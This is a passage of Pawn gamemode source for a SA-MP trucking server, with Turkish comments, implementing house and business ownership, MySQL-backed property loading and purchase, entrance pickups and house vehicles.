	for (new i; i < sizeof(AHelpTopics); i++)
	{
		format(HelpList, 1000, "%s%s\n", HelpList, AHelpTopics[i]);
	}

	// Show the commands in a dialog
	ShowPlayerDialog(playerid, DialogHelpItemChosen, DIALOG_STYLE_LIST, DialogTitle, HelpList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);

	return 1;
}

// ************************************************************************************************************************************************************
// PPC_Housing
// ************************************************************************************************************************************************************

SaveAllHouses()
{
    new file[100];
	for(new HouseID; HouseID < MAX_HOUSES; HouseID++)
	{
		format(file, sizeof(file), HouseFile, HouseID);
		if(fexist(file))
		{
		    HouseFile_Save(HouseID);
		}
	}
	return 1;
}
/*
SaveAllBusiness()
{
    new file[100];
	for(new BusinessID; BusinessID < MAX_BUSINESS; BusinessID++)
	{
		format(file, sizeof(file), BusinessFile, BusinessID);
		if(fexist(file))
		{
		    BusinessFile_Save(BusinessID);
		}
	}
	return 1;
}*/

// This function returns the first free house-slot for the given player
/*Player_GetFreeHouseSlot(playerid)
{
	// Check if the player has room for another house (he hasn't bought the maximum amount of houses per player yet)
	// and get the slot-id
	for (new HouseIndex; HouseIndex < MAX_HOUSESPERPLAYER; HouseIndex++) // Loop through all house-slots of the player
		if (APlayerData[playerid][Houses][HouseIndex] == 0) // Check if this house slot is free
		    return HouseIndex; // Return the free HouseIndex for this player

	// If there were no free house-slots, return "-1"
	return -1;
}
*/

// Player_ResetHouses ( APlayerData'daki Evleri Sýfýrlar Zararsýz )
Player_ResetHouses(playerid)
{
    for(new HouseIndex; HouseIndex < MAX_HOUSESPERPLAYER; HouseIndex++)
    {
        APlayerData[playerid][Houses][HouseIndex] = 0;
    }
	return 1;
}

/*// Player_LoadHouses ( APlayerData'ya Evleri Yükler )  Eski 30/04/2018 saat 2:04
Player_LoadHouses(playerid)
{
	Player_ResetHouses(playerid);
	new HouseIndex = 0;
	for(new id; id < MAX_HOUSES_N; id++)
	{
	    //if(HouseData[id][Owned] == false) continue; Eski Ev Sistemi
	    if(!strcmp(HouseData[id][Owner], GetName(playerid), true))
	    {
	        APlayerData[playerid][Houses][HouseIndex] = id;
	        Evlerii[playerid][HouseIndex] = id;
	        HouseIndex++;
	    }
	}
	return 1;
}*/

// Player_LoadBusiness ( APlayerData'ya Ýþyerlerini Yükler )
Player_LoadHouses(playerid)
{
	Player_ResetHouses(playerid);
	new HouseIndex = 0;

	new query[256], id, Cache: get_evler;

	mysql_format(Connection, query, sizeof(query), "SELECT ID FROM houses WHERE HouseOwner='%s'", GetName(playerid));
	get_evler = mysql_query(Connection, query);
	new rows = cache_num_rows();

	if(rows)
	{
		for(new i; i < rows; ++i)
 		{
 		    cache_get_value_name_int(i, "ID", id);

	        APlayerData[playerid][Houses][HouseIndex] = id;
	        Evlerii[playerid][HouseIndex] = id;
	        HouseIndex++;
   		}
	}

	cache_delete(get_evler);
/*	for(new BusID; BusID < MAX_BUSINESS; BusID++)
	{
	    if(ABusinessData[BusID][Owned] == false) continue;
	    if(!strcmp(ABusinessData[BusID][Owner], GetName(playerid), true))
	    {
	        APlayerData[playerid][Business][BusIndex] = BusID;
	        BusIndex++;
	    }
	}
*/
	return 1;
}

// Player_CountHouses ( Oyuncunun Evlerini Sayar )
Player_CountHouses(playerid)
{
	new Sonuc = 0;
	for(new HouseID; HouseID < MAX_HOUSES; HouseID++)
	{
	    if(AHouseData[HouseID][Owned] == false) continue;
	    if(!strcmp(AHouseData[HouseID][Owner], GetName(playerid), true))
	    {
	        Sonuc++;
	    }
	}
	return Sonuc;
}

// This function returns the maximum number of car-slots, based on the house-level
House_GetMaxCarSlots(HouseID)
{
	// Return the maximum number of carslots, based on the house-level (every level has one carslot, so return the houselevel)
	return AHouseData[HouseID][HouseLevel];
}

// This function returns the first free carslot in the given house (or -1 if no free slot is found)
House_GetFreeCarSlot(HouseID)
{
	// Get the maximum number of carslots for this house (based on the house-level)
	new MaxCarSlots = House_GetMaxCarSlots(HouseID);

	// Get the maximum number of carslots for this house and make a loop through all carslots for this house
	for (new CarSlot; CarSlot < MaxCarSlots; CarSlot++)
	{
		// Check if the carslot is empty
		if (AHouseData[HouseID][VehicleIDs][CarSlot] == 0)
		    return CarSlot; // Return the carslot-id
	}

	// If no carslots are free, return -1
	return -1;
}


/*
// This function sets ownership to the given player
House_SetOwner(playerid, HouseID)
{
	// Setup local variables
	new HouseSlotFree, Name[24], Msg[128];

	// Get the first free house-slot from this player
	//HouseSlotFree = Player_GetFreeHouseSlot(playerid);

	// Check if the player has a free house-slot
	if (HouseSlotFree != -1)
	{
		// Get the player's name
		GetPlayerName(playerid, Name, sizeof(Name));

		// Store the house-id for the player
		//APlayerData[playerid][Houses][HouseSlotFree] = HouseID;
		// Let the player pay for the house
		RewardPlayer(playerid, -AHouseData[HouseID][HousePrice], 0);

		// Set the house as owned
		AHouseData[HouseID][Owned] = true;
		// Store the owner-name for the house
		format(AHouseData[HouseID][Owner], 24, Name);
		// Set the level to 1
		AHouseData[HouseID][HouseLevel] = 1;
		// Set the default house-name ("<playername>'s house")
		format(AHouseData[HouseID][HouseName], 100, TXT_DefaultHouseName, Name);

		// Also, update the pickup and map-icon for this house
		House_UpdateEntrance(HouseID);

		// Save the player-file (and also his houses/businesses)
		Oyuncu_Kaydet(playerid);
		HouseFile_Save(HouseID);

		// Let the player know he bought the house
		format(Msg, 128, TXT_PlayerBoughtHouse, AHouseData[HouseID][HousePrice]);
		SendClientMessage(playerid, 0xFFFFFFFF, Msg);
	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, TXT_PlayerOwnsMaxHouses);

	return 1;
}

*/

// This function is used to spawn back at the entrance of your house
House_Exit(playerid, HouseID)
{
	// Set the player in the normal world again
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	// Set the position of the player at the entrance of his house
	SetPlayerPos(playerid, AHouseData[HouseID][HouseX], AHouseData[HouseID][HouseY], AHouseData[HouseID][HouseZ]);
	// Also clear the tracking-variable to track in which house the player is
	APlayerData[playerid][CurrentHouse] = 0;

	// Check if there is a timer-value set for exiting the house (this timer freezes the player while the environment is being loaded)
	if (ExitHouseTimer > 0)
	{
		// Don't allow the player to fall
	    TogglePlayerControllable(playerid, 0);
		// Let the player know he's frozen for 5 seconds
		GameTextForPlayer(playerid, TXT_ExitHouseReloadEnv, ExitHouseTimer, 4);
		// Start a timer that will allow the player to fall again when the environment has loaded
		SetTimerEx("House_ExitTimer", ExitHouseTimer, false, "ii", playerid, HouseID);
	}

	return 1;
}

forward House_ExitTimer(playerid, HouseID);
public House_ExitTimer(playerid, HouseID)
{
	// Allow the player to move again (environment should have been loaded now)
    TogglePlayerControllable(playerid, 1);

	// Respawn the player's vehicles near the house (only the vehicles that belong to this house)
	for (new CarSlot; CarSlot < 11; CarSlot++)
		if (AHouseData[HouseID][VehicleIDs][CarSlot] != 0)
		    SetVehicleToRespawn(AHouseData[HouseID][VehicleIDs][CarSlot]);

	return 1;
}


/*
// This function adds a pickup for the given house
House_CreateEntrance(HouseID)
{
	// Setup local variables
	new Msg[500], Float:x, Float:y, Float:z;

	// Get the coordinates of the house's pickup (usually near the door)
	x = AHouseData[HouseID][HouseX];
	y = AHouseData[HouseID][HouseY];
	z = AHouseData[HouseID][HouseZ];

	// Add a new pickup at the house's location (usually near the door), green = free, blue = owned
	if (AHouseData[HouseID][Owned] == true)
	{
		// Create a blue house-pickup (house is owned)
 		AHouseData[HouseID][PickupID] = CreateDynamicPickup(1272, 1, x, y, z, 0);
		// Create the 3DText that appears above the house-pickup (displays the housename and the name of the owner)
		format(Msg, 500, TXT_PickupHouseOwned, AHouseData[HouseID][HouseName], HouseID, AHouseData[HouseID][Owner], AHouseData[HouseID][HouseLevel]);
		AHouseData[HouseID][DoorText] = CreateDynamic3DTextLabel(Msg, 0x008080FF, x, y, z + 1.0, 50.0);
		// Add a streamed icon to the map (red house), type = 32, color = 0, world = 0, interior = 0, playerid = -1, drawdist = 150.0
		if (ShowBoughtHouses == true)
			AHouseData[HouseID][MapIconID] = CreateDynamicMapIcon(x, y, z, 32, 0, 0, 0, -1, 150.0);
	}
	else
	{
        // Create a green house-pickup (house is free)
		AHouseData[HouseID][PickupID] = CreateDynamicPickup(1273, 1, x, y, z, 0);
		// Create the 3DText that appears above the house-pickup (displays the price of the house)
		format(Msg, 500, TXT_PickupHouseForSale, HouseID, AHouseData[HouseID][HousePrice], AHouseData[HouseID][HouseMaxLevel]);
		AHouseData[HouseID][DoorText] = CreateDynamic3DTextLabel(Msg, 0x008080FF, x, y, z + 1.0, 50.0);
		// Add a streamed icon to the map (green house), type = 31, color = 0, world = 0, interior = 0, playerid = -1, drawdist = 150.0
		AHouseData[HouseID][MapIconID] = CreateDynamicMapIcon(x, y, z, 31, 0, 0, 0, -1, 150.0);
	}
}
*/
// This function changes the pickup (and map-icon) for the given house (used when buying or selling a house)
House_UpdateEntrance(HouseID)
{
	// Setup local variables
	new Msg[500], Float:x, Float:y, Float:z;

	// Get the coordinates of the house's pickup (usually near the door)
	x = AHouseData[HouseID][HouseX];
	y = AHouseData[HouseID][HouseY];
	z = AHouseData[HouseID][HouseZ];

	// Destroy the pickup and map-icon near the house's entrance
	DestroyDynamicPickup(AHouseData[HouseID][PickupID]);
	DestroyDynamicMapIcon(AHouseData[HouseID][MapIconID]);

	// Add a new pickup at the house's location (usually near the door), green = free, blue = owned
	if (AHouseData[HouseID][Owned] == true)
	{
		// Create a blue house-pickup (house is owned)
 		AHouseData[HouseID][PickupID] = CreateDynamicPickup(1272, 1, x, y, z, 0);
		// Update the 3DText that appears above the house-pickup (displays the housename and the name of the owner)
		format(Msg, 500, TXT_PickupHouseOwned, AHouseData[HouseID][HouseName], HouseID, AHouseData[HouseID][Owner], AHouseData[HouseID][HouseLevel]);
		UpdateDynamic3DTextLabelText(AHouseData[HouseID][DoorText], 0x008080FF, Msg);
		// Add a streamed icon to the map (red house), type = 32, color = 0, world = 0, interior = 0, playerid = -1, drawdist = 150.0
		if (ShowBoughtHouses == true)
			AHouseData[HouseID][MapIconID] = CreateDynamicMapIcon(x, y, z, 32, 0, 0, 0, -1, 150.0);
	}
	else
	{
        // Create a green house-pickup (house is free)
		AHouseData[HouseID][PickupID] = CreateDynamicPickup(1273, 1, x, y, z, 0);
		// Update the 3DText that appears above the house-pickup (displays the price of the house)
		format(Msg, 128, TXT_PickupHouseForSale, HouseID, AHouseData[HouseID][HousePrice], AHouseData[HouseID][HouseMaxLevel]);
		UpdateDynamic3DTextLabelText(AHouseData[HouseID][DoorText], 0x008080FF, Msg);
		// Add a streamed icon to the map (green house), type = 31, color = 0, world = 0, interior = 0, playerid = -1, drawdist = 150.0
		AHouseData[HouseID][MapIconID] = CreateDynamicMapIcon(x, y, z, 31, 0, 0, 0, -1, 150.0);
	}
}

// This function adds a vehicle to the house (if possible)
House_AddVehicle(HouseID, cModel, cPaint, cComponents[], Float:cx, Float:cy, Float:cz, Float:crot, Col1, Col2)
{
	// Setup local variables
	new vid, CarSlot;

	// Get a free carslot from the house
	CarSlot = House_GetFreeCarSlot(HouseID);

	// Check if there is a free carslot
	if (CarSlot != -1)
	{
		// Create a new vehicle and get the vehicle-id
		vid = CreateVehicle(cModel, cx, cy, cz, crot, Col1, Col2, 600);
		// Store the vehicle-id in the house's free carslot
		AHouseData[HouseID][VehicleIDs][CarSlot] = vid;

		// Save the model of the vehicle
		AVehicleData[vid][Model] = cModel;
		// Save the paintjob of the vehicle and apply it
		AVehicleData[vid][PaintJob] = cPaint;
		if (cPaint != 0)
			ChangeVehiclePaintjob(vid, cPaint - 1);

		// Also update the car-color
		ChangeVehicleColor(vid, Col1, Col2);
		// Save the colors of the vehicle
		AVehicleData[vid][Color1] = Col1;
		AVehicleData[vid][Color2] = Col2;

		// Save the components of the vehicle and apply them
		for (new i; i < 14; i++)
		{
			AVehicleData[vid][Components][i] = cComponents[i];
		    // Check if the componentslot has a valid component-id
			if (AVehicleData[vid][Components][i] != 0)
		        AddVehicleComponent(vid, AVehicleData[vid][Components][i]); // Add the component to the vehicle
		}

		// Save the spawn-data of the vehicle
        AVehicleData[vid][SpawnX] = cx;
        AVehicleData[vid][SpawnY] = cy;
        AVehicleData[vid][SpawnZ] = cz;
        AVehicleData[vid][SpawnRot] = crot;
		// Also set the fuel to maximum
		AVehicleData[vid][Fuel] = MaxFuel;
		// Also set the owner
		AVehicleData[vid][Owned] = true;
		format(AVehicleData[vid][Owner], 24, AHouseData[HouseID][Owner]);
		// Save the HouseID for the vehicle
		AVehicleData[vid][BelongsToHouse] = HouseID;
	}
	else // No free carslot was found, return 0
		return 0;

	// Exit the function and return the vehicle-id
	return vid;
}

// This function is used only when you respawn your vehicles by exiting your house
House_ReplaceVehicle(HouseID, CarSlot)
{
	// Setup local variables
	new vid, cModel, cPaint, cComponents[14], Float:cx, Float:cy, Float:cz, Float:crot, Col1, Col2, Float:Health, cFuel;
	new panels, doors, lights, tires;

	// Get the data from the already existing vehicle that was parked before
	vid = AHouseData[HouseID][VehicleIDs][CarSlot];
	cModel = AVehicleData[vid][Model];
	cPaint = AVehicleData[vid][PaintJob];
	cFuel = AVehicleData[vid][Fuel];
	for (new i; i < 14; i++)
	    cComponents[i] = AVehicleData[vid][Components][i];
	Col1 = AVehicleData[vid][Color1];
	Col2 = AVehicleData[vid][Color2];
	cx = AVehicleData[vid][SpawnX];
	cy = AVehicleData[vid][SpawnY];
	cz = AVehicleData[vid][SpawnZ];
	crot = AVehicleData[vid][SpawnRot];
	GetVehicleHealth(vid, Health);
	GetVehicleDamageStatus(vid, panels, doors, lights, tires);

	// Delete the vehicle and clear the data
	Vehicle_Delete(vid);

	// Create a new vehicle in the same carslot
	vid = House_AddVehicle(HouseID, cModel, cPaint, cComponents, Float:cx, Float:cy, Float:cz, Float:crot, Col1, Col2);
	// Update the fuel of the vehicle to the previous setting
	AVehicleData[vid][Fuel] = cFuel;
	// Update the health to what it was before and update the bodywork
	SetVehicleHealth(vid, Health);
	UpdateVehicleDamageStatus(vid, panels, doors, lights, tires);

	return vid;
}

// This function is used only when a player logs out (the vehicles are unloaded)
House_RemoveVehicles(HouseID)
{
	// Setup local variables
	new vid;

	// Loop through all carslots of this house
	for (new CarSlot; CarSlot < 11; CarSlot++)
	{
		// Get the vehicle-id
		vid = AHouseData[HouseID][VehicleIDs][CarSlot];

		// Check if there was a vehicle in this carslot
		if (vid != 0)
		{
			if(Flashing[vid] == true)
			{
	    		KillTimer(FlashTime[vid]);
	    		Flashing[vid] = false;
			}
			// Delete the vehicle and clear the data
			DestroyVehicle(vid);
			AHouseData[HouseID][VehicleIDs][CarSlot] = 0;
			AVehicleData[vid][Owned] = false;
			AVehicleData[vid][Owner] = 0;
			AVehicleData[vid][Model] = 0;
			AVehicleData[vid][PaintJob] = 0;
			for (new i; i < 14; i++)
			    AVehicleData[vid][Components][i] = 0;
			AVehicleData[vid][SpawnX] = 0.0;
			AVehicleData[vid][SpawnY] = 0.0;
			AVehicleData[vid][SpawnZ] = 0.0;
			AVehicleData[vid][SpawnRot] = 0.0;
			AVehicleData[vid][BelongsToHouse] = 0;
		}
	}
}
/*
House_RespawnVehicles(HouseID)
{
	// Setup local variables
	new vid;

	// Loop through all carslots of this house
	for (new CarSlot; CarSlot < 11; CarSlot++)
	{
		// Get the vehicle-id
		vid = AHouseData[HouseID][VehicleIDs][CarSlot];

		// Check if there was a vehicle in this carslot
		if (vid != 0)
		{
			SetVehicleToRespawn(vid);
		}
	}
}
*/
// This function calculates the sell-price for the given house
House_CalcSellPrice(HouseID)
{
	// Setup local variables
	new SellPrice, NumUpgrades, UpgradePrice;

	// Calculate 50% of the original buying price (base-price for selling)
	SellPrice = AHouseData[HouseID][HousePrice];
	// Calculate the number of upgrades applied to the house
	NumUpgrades = AHouseData[HouseID][HouseLevel] - 1;
	// Also calculate 50% for each upgrade, based on the percentage for upgrading the house
	UpgradePrice = ((AHouseData[HouseID][HousePrice] / 100) * HouseUpgradePercent) * NumUpgrades;

	// Add 50% of the upgrade-price to the sell-price
	SellPrice = SellPrice + UpgradePrice;

	// Return the total sell-price to the calling function
	return SellPrice;
}
// his function returns "1" if the given player is the owner of the given house
House_PlayerIsOwner(playerid, HouseID)
{
	// Loop through all houses owner by this player
/*	for (new i; i < MAX_HOUSESPERPLAYER; i++)
	{
		// Check if the player owns the house in any of his house-slots
		if (APlayerData[playerid][Houses][i] == HouseID)
		    return 1;
	}*/
	if(AHouseData[HouseID][Owned] == false) return 0;
	if(!strcmp(AHouseData[HouseID][Owner], GetName(playerid), true))
	{
	    return 1;
	}
	// If the player doesn't own the house, return 0
	return 0;
}

Business_PlayerIsOwner(playerid, HouseID)
{
	// Loop through all houses owner by this player
/*	for (new i; i < MAX_BUSINESSPERPLAYER; i++)
	{
		// Check if the player owns the house in any of his house-slots
		if (APlayerData[playerid][Business][i] == HouseID)
		    return 1;
	}*/

 	new query[256], bSahipli, bSahip[40], Cache: get_isyeri, rows;
	mysql_format(Connection, query, sizeof(query), "SELECT Sahipli,Sahip FROM isyerleri WHERE ID = '%d'", HouseID);
	get_isyeri = mysql_query(Connection, query);
	rows = cache_num_rows();

	if(rows)
	{
		for(new i; i < rows; ++i)
		{
			cache_get_value_name_int(i, "Sahipli", bSahipli);
			cache_get_value_name(i, "Sahip", bSahip);
		}
	}

	cache_delete(get_isyeri);

	if(bSahipli == 0) return 0;
	if(!strcmp(bSahip, GetName(playerid), true))
	{
	    return 1;
	}
	// If the player doesn't own the house, return 0
	return 0;
}

// ************************************************************************************************************************************************************
// PPC_Business
// ************************************************************************************************************************************************************

// This timer increases the variable "BusinessTransactionTime" every hour
/*forward Business_TransactionTimer();
public Business_TransactionTimer()
{
	// Increase the variable by one
    BusinessTransactionTime++;

	// And save it to the file
	BusinessTime_Save();
}
*/


// This function returns the first free business-slot for the given player
/*Player_GetFreeBusinessSlot(playerid)
{
	// Check if the player has room for another business (he hasn't bought the maximum amount of businesses per player yet)
	// and get the slot-id
	for (new BusIndex; BusIndex < MAX_BUSINESSPERPLAYER; BusIndex++) // Loop through all business-slots of the player
		if (APlayerData[playerid][Business][BusIndex] == 0) // Check if this business slot is free
		    return BusIndex; // Return the free BusIndex for this player

	// If there were no free business-slots, return "-1"
	return -1;
}
*/

// Player_ResetBusiness ( APlayerData'daki Ýþyerlerini Sýfýrlar Zararsýz )
Player_ResetBusiness(playerid)
{
    for(new BusIndex; BusIndex < MAX_BUSINESSPERPLAYER; BusIndex++)
    {
        APlayerData[playerid][Business][BusIndex] = 0;
    }
	return 1;
}

// Player_LoadBusiness ( APlayerData'ya Ýþyerlerini Yükler )
Player_LoadBusiness(playerid)
{
	Player_ResetBusiness(playerid);
	new BusIndex = 0;

	new query[256], bID, Cache: get_isyeri;

	mysql_format(Connection, query, sizeof(query), "SELECT ID FROM isyerleri WHERE Sahip='%s'", GetName(playerid));
	get_isyeri = mysql_query(Connection, query);
	new rows = cache_num_rows();

	if(rows)
	{
		for(new i; i < rows; ++i)
 		{
 		    cache_get_value_name_int(i, "ID", bID);

	        APlayerData[playerid][Business][BusIndex] = bID;
	        BusIndex++;
   		}
	}

	cache_delete(get_isyeri);
/*	for(new BusID; BusID < MAX_BUSINESS; BusID++)
	{
	    if(ABusinessData[BusID][Owned] == false) continue;
	    if(!strcmp(ABusinessData[BusID][Owner], GetName(playerid), true))
	    {
	        APlayerData[playerid][Business][BusIndex] = BusID;
	        BusIndex++;
	    }
	}
*/
	return 1;
}

// Player_CountBusiness ( Oyuncunun Ýþyerlerini Sayar )
Player_CountBusiness(playerid)
{
	new query[144], Cache: find_isyeri;

	mysql_format(Connection, query, sizeof(query), "SELECT null FROM isyerleri WHERE Sahip='%s'", GetName(playerid));
	find_isyeri = mysql_query(Connection, query);

	new Sonuc = cache_num_rows();

	cache_delete(find_isyeri);
/*
	new Sonuc = 0;
	for(new BusID; BusID < MAX_BUSINESS; BusID++)
	{
	    if(ABusinessData[BusID][Owned] == false) continue;
	    if(!strcmp(ABusinessData[BusID][Owner], GetName(playerid), true))
	    {
	        Sonuc++;
	    }
	}
*/
	return Sonuc;
}

// This function sets ownership to the given player
Business_SetOwner(playerid, BusID)
{
	// Setup local variables
	new BusSlotFree, /*Name[24],*/ Msg[128], BusType;

	// Get the first free business-slot from this player
	//BusSlotFree = Player_GetFreeBusinessSlot(playerid);

	// Check if the player has a free business-slot
	if (BusSlotFree != -1)
	{
		// Get the player's name
		//GetPlayerName(playerid, Name, sizeof(Name));

		// Store the business-id for the player
		//APlayerData[playerid][Business][BusSlotFree] = BusID;
		// Get the business-type
		BusType = ABusinessData[BusID][BusinessType];

		// Let the player pay for the business
		RewardPlayer(playerid, -ABusinessInteriors[BusType][BusPrice], 0);

		/*
		// Set the business as owned
		ABusinessData[BusID][Owned] = true;
		// Store the owner-name for the business
		format(ABusinessData[BusID][Owner], 24, Name);
		// Set the level to 1
		ABusinessData[BusID][BusinessLevel] = 1;
		// Set the default business-name
		format(ABusinessData[BusID][BusinessName], 100, ABusinessInteriors[BusType][InteriorName]);
		// Store the current transaction-time (this is used so the player can only retrieve cash from the business from the moment he bought it)
		ABusinessData[BusID][LastTransaction] = BusinessTransactionTime;
		*/

        ABusinessData[BusID][Owned] = true;
        
		new query[512];
		format(query, 512, "UPDATE isyerleri SET Isim='%s',Level='1',Kasa='0',Sahipli='1',Sahip='%s' WHERE ID = %d", ABusinessInteriors[BusType][InteriorName], GetName(playerid), BusID);
		mysql_query(Connection, query);

		// Also, update 3DText of this business
		Business_UpdateEntrance(BusID);

		// Save the player-file (and also his houses/businesses)
		Oyuncu_Kaydet(playerid);
		//BusinessFile_Save(BusID);

		// Let the player know he bought the business
		format(Msg, 128, TXT_PlayerBoughtBusiness, ABusinessInteriors[BusType][BusPrice]);
		SendClientMessage(playerid, 0xFFFFFFFF, Msg);

		format(Msg, 128, "[ALIS] NICK : %s  -- ISYERI : %d-%s --  FIYAT : $%d", GetName(playerid),BusID,ABusinessInteriors[BusType][InteriorName],ABusinessInteriors[BusType][BusPrice]);
		ISYERIALMA(Msg);

	}
	else
	    SendClientMessage(playerid, 0xFFFFFFFF, TXT_PlayerOwnsMaxBusinesses);

	return 1;
}



// This function is used to spawn back at the entrance of your business
Business_Exit(playerid, BusID)
{
	// Set the player in the normal world again
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);
	// Set the position of the player at the entrance of his business
	SetPlayerPos(playerid, ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ]);
	// Also clear the tracking-variable to track in which business the player is
	APlayerData[playerid][CurrentBusiness] = 0;

	// Check if there is a timer-value set for exiting the business (this timer freezes the player while the environment is being loaded)
	if (ExitBusinessTimer > 0)
	{
		// Don't allow the player to fall
	    TogglePlayerControllable(playerid, 0);
		// Let the player know he's frozen for 5 seconds
		GameTextForPlayer(playerid, TXT_ExitHouseReloadEnv, ExitBusinessTimer, 4);
		// Start a timer that will allow the player to fall again when the environment has loaded
		SetTimerEx("Business_ExitTimer", ExitBusinessTimer, false, "ii", playerid, BusID);
	}

	return 1;
}

forward Business_ExitTimer(playerid, BusID);
public Business_ExitTimer(playerid, BusID)
{
	// Allow the player to move again (environment should have been loaded now)
    TogglePlayerControllable(playerid, 1);

	return 1;
}



// This function adds a pickup for the given business
Business_CreateEntrance(BusID)
{
	new query[256], Msg[500], bID, bName[100], bSahip[40], BusType, Icon, Float:x, Float:y, Float:z, Cache: get_isyeri;

	mysql_format(Connection, query, sizeof(query), "SELECT * FROM isyerleri WHERE ID = '%d'", BusID);
	get_isyeri = mysql_query(Connection, query);
	new rows = cache_num_rows();
	new bbshp, bblvl;
	
	if(rows)
	{
		for(new i; i < rows; ++i)
 		{
 		    cache_get_value_name_int(i, "ID", bID);

			cache_get_value_name(i, "Isim", bName);
			cache_get_value_name(i, "Sahip", bSahip);

			x = ABusinessData[bID][BusinessX];
			y = ABusinessData[bID][BusinessY];
			z = ABusinessData[bID][BusinessZ];

			BusType = ABusinessData[bID][BusinessType];
			Icon = ABusinessInteriors[BusType][IconID];

			ABusinessData[bID][PickupID] = CreateDynamicPickup(1274, 1, x, y, z, 0);
			ABusinessData[bID][MapIconID] = CreateDynamicMapIcon(x, y, z, Icon, 0, 0, 0, -1, 150.0);

			cache_get_value_name_int(i, "Sahipli", bbshp);
			if(bbshp == 1)
			{
			    cache_get_value_name_int(i, "Level", bblvl);
				format(Msg, 500, TXT_PickupBusinessOwned, bName, bID, bSahip, bblvl);
				ABusinessData[bID][DoorText] = CreateDynamic3DTextLabel(Msg, 0x008080FF, x, y, z + 1.0, 50.0);
			}else{
				format(Msg, 500, TXT_PickupBusinessForSale, ABusinessInteriors[BusType][InteriorName], BusID, ABusinessInteriors[BusType][BusPrice], ABusinessInteriors[BusType][BusEarnings]);
				ABusinessData[bID][DoorText] = CreateDynamic3DTextLabel(Msg, 0x008080FF, x, y, z + 1.0, 50.0);
			}
   		}
	}

	cache_delete(get_isyeri);
}

// This function changes the 3DText for the given business (used when buying or selling a business)
Business_UpdateEntrance(BusID)
{
	new query[256], Msg[500], bID, bName[100], bSahip[40], BusType, Cache: get_isyeri;

	mysql_format(Connection, query, sizeof(query), "SELECT * FROM isyerleri WHERE ID = '%d'", BusID);
	get_isyeri = mysql_query(Connection, query);
	new rows = cache_num_rows();
	new bbshpl, bblvl;
	if(rows)
	{
		for(new i; i < rows; ++i)
 		{
 		    cache_get_value_name_int(i, "ID", bID);

			cache_get_value_name(i, "Isim", bName);
			cache_get_value_name(i, "Sahip", bSahip);

			BusType = ABusinessData[bID][BusinessType];

            cache_get_value_name_int(i, "Sahipli", bbshpl);
			if(bbshpl == 1)
			{
			    cache_get_value_name_int(i, "Level", bblvl);
				format(Msg, 500, TXT_PickupBusinessOwned, bName, bID, bSahip, bblvl);
				UpdateDynamic3DTextLabelText(ABusinessData[bID][DoorText], 0x008080FF, Msg);
			}else{
				format(Msg, 500, TXT_PickupBusinessForSale, ABusinessInteriors[BusType][InteriorName], BusID, ABusinessInteriors[BusType][BusPrice], ABusinessInteriors[BusType][BusEarnings]);
				UpdateDynamic3DTextLabelText(ABusinessData[bID][DoorText], 0x008080FF, Msg);
			}
   		}
	}

	cache_delete(get_isyeri);

}

// This function pays the current earnings of the given business to the player
Business_PayEarnings(playerid, BusID)
{
	new query[256], Msg[128], Cache: get_isyeri;

	mysql_format(Connection, query, sizeof(query), "SELECT Kasa FROM isyerleri WHERE ID = '%d'", BusID);
	get_isyeri = mysql_query(Connection, query);
	new rows = cache_num_rows();
	new bbks;

	if(rows)
	{
		for(new i; i < rows; ++i)
 		{
 		    cache_get_value_name_int(i, "Kasa", bbks);
			RewardPlayer(playerid, bbks, 0);

			format(Msg, 128, "{FFCC00}» {FFFFFF}Ýþyerinizin kasasýnda biriken {00CED1}%d${ADFF2F}'ý çektiniz.", bbks);
			SendClientMessage(playerid, 0xFFFFFFFF, Msg);
   		}
	}

	cache_delete(get_isyeri);

	format(query, 256, "UPDATE isyerleri SET Kasa='0' WHERE ID = %d", BusID);
	mysql_query(Connection, query);

}
// ************************************************************************************************************************************************************
// PPC_GameModeInit
// ************************************************************************************************************************************************************

// This function is required only once to fix houses that were bought and sold again
// If you would sell a house, then restart the server, that house cannot be bought again (= bugged)
// The player doesn't own the house anymore, but the house still has the player as owner
// This function loops through all houses and checks if the owner (if any) still owns the house
// If the owner doesn't own the house, the house's ownership is cleared and the house-file will be re-saved
// After the fixing, you should remove the call to this function inModeInit, compile and restart the server
// as this function is only required once
/*stock FixHouses()
{
	// Setup local variables
	new file[100], File:PFile, Name[24], LineFromFile[100], ParameterName[50], ParameterValue[50];
	new bool:PlayerOwnedTheHouse = true, HousesFixed;

	// Loop through all houses
	for (new HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
	{
		// Check if the house is owned
		if (AHouseData[HouseID][Owned] == true)
		{
			// Get the name of the owner
			format(Name, 24, AHouseData[HouseID][Owner]);
			// Construct the complete filename for this player's account
			format(file, sizeof(file), PlayerFile, Name);

			// Check if the player's datafile exists
			if (fexist(file))
			{
				PFile = fopen(file, io_read); // Open the playerfile for reading

				fread(PFile, LineFromFile); // Read the first line of the file

				// Keep reading until the end of the file is found (no more data)
				while (strlen(LineFromFile) > 0)
				{
					StripNewLine(LineFromFile); // Strip any newline characters from the LineFromFile
					sscanf(LineFromFile, "s[50]s[50]", ParameterName, ParameterValue); // Extract parametername and parametervalue

                    // If the parametername is correct ("House")
					if (strcmp(ParameterName, "House", false) == 0)
					{
					    // Check if the player owns this house
					    if (strval(ParameterValue) == HouseID)
                            PlayerOwnedTheHouse = true; // The player really owns the house
					}

                    // Read the next line of the file
					fread(PFile, LineFromFile);
				}

                // Close the player-file
				fclose(PFile);

				// Check if the player doesn't own the house
				if (PlayerOwnedTheHouse == false)
				{
					// Clear the ownership from the house
					AHouseData[HouseID][Owned] = false;
					AHouseData[HouseID][Owner] = 0;
					AHouseData[HouseID][HouseName] = 0;
					AHouseData[HouseID][HouseLevel] = 1;
					// Update the house-entrance
					House_UpdateEntrance(HouseID);
					// Save the house, hereby fixing the ownership-bug
					HouseFile_Save(HouseID);
					// Increase the number of houses that have been fixed
					HousesFixed++;
				}

				// Reset the variable that holds if the player owned the house, so the next house/owner can be processed
                PlayerOwnedTheHouse = false;
			}
		}
	}

	// All houses have been processed, now print a line to the server's console
	printf(TXT_HousesFixed, HousesFixed);
}*/



// Add all static vehicles and pickups when the server starts that are required
GameModeInit_VehiclesPickups()
{
	// Setup local variables
	new LastVehicleMsg[100], LastObjectMsg[100], LastHouseMsg[100], LastBusinessMsg[100], LastCameraMsg[100];

	// Add some trucks to all trucking depots
	GameModeInit_TruckDepots();
